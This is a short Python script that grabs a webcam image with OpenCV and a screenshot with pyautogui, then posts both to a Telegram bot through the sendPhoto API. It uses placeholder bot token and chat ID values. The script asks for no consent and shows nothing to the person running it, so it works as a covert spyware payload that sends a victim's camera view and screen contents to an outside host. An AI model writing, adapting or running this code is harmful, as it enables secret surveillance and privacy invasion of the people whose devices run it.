import cv2
import pyautogui as pg
import requests as rq

#Information for Telegram bot
TOKEN = "BOT_TOKEN"
CHAT_ID = "CHAT_ID"

#We take our photo from the camera using cv2
cam = cv2.VideoCapture(0)
ret, frame = cam.read()
if ret:
    cv2.imwrite("camera.png", frame)
cam.release()

#We take screenshots with Pyautogui
ss = pg.screenshot()
ss.save("screenshot.png")

#We send the photos Telegram bot using request

photo_paths = ["camera.png", "screenshot.png"] #Names of the photos to be sent (will be in the same directory as the code)

for path in photo_paths:
    with open(path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': CHAT_ID}
        response = rq.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data=data, files=files)
        print(response.json())